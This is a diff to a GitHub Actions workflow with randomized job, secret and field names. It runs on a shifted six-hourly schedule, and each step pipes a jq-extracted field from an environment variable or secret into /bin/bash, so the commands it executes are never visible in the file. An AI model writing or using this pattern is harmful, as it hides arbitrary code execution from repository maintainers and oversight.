@@ -1,24 +1,22 @@
 name: zhaojinan7890
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
+    - cron: '24 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zhaojinan7890
         env:
-          p3301: ${{ secrets.p3301 }}
+          kqsfg48: ${{ secrets.kqsfg48 }}
         run: |
-          echo $p3301 | jq -r .eiyq886 | /bin/bash
-          echo $glkl967 | jq -r .iy7650 | /bin/bash
-          echo $qwgr50541 | jq -r .s46157 | /bin/bash
-          echo $slvec01 | jq -r .jm160 | /bin/bash
-          echo $jd34183 | jq -r .dydf32585 | /bin/bash
-          echo $empo6499 | jq -r .e4 | /bin/bash
-          echo $qm47784 | jq -r .txmdb78738 | /bin/bash
+          echo $kqsfg48 | jq -r .qfpwi66857 | /bin/bash
+          echo $wjbea89508 | jq -r .cqxt1 | /bin/bash
+          echo $ixdo6311 | jq -r .n5188 | /bin/bash
+          echo $hq2988 | jq -r .yiii1 | /bin/bash
+          echo $kvnf73 | jq -r .pojt62 | /bin/bash
 
